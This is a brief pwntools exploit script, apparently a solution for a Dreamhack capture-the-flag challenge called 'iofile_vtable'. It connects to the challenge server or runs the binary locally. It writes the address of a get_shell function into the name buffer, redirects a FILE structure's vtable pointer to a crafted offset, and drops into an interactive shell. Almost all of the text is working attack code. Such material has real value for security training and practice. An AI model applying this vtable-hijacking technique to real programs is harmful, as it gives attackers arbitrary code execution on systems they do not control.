#!/usr/bin/env python3
from pwn import *

PORT = 20557
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./iofile_vtable', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x0000000400A85
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(i): sla(b'> ', str(i).encode())

sa(b'what is your name: ', p64(elf.sym.get_shell))
menu(4)
# GDB()
sa(b'change: ', p64(0x6010D0-0x38))

p.interactive()